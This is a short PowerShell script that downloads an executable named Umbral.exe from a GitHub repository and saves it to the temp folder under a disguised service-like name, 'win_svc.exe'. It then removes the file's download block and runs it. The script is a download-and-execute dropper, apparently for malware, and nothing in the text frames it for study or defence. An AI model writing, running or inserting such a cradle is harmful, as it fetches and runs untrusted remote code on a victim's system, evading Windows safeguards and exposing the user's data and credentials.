$u='https://github.com/bober6616/telegram_bot/raw/main/Umbral.exe'
$p="$env:TEMP\win_svc.exe"
iwr -Uri $u -OutFile $p
Unblock-File -Path $p
Start-Process -FilePath $p
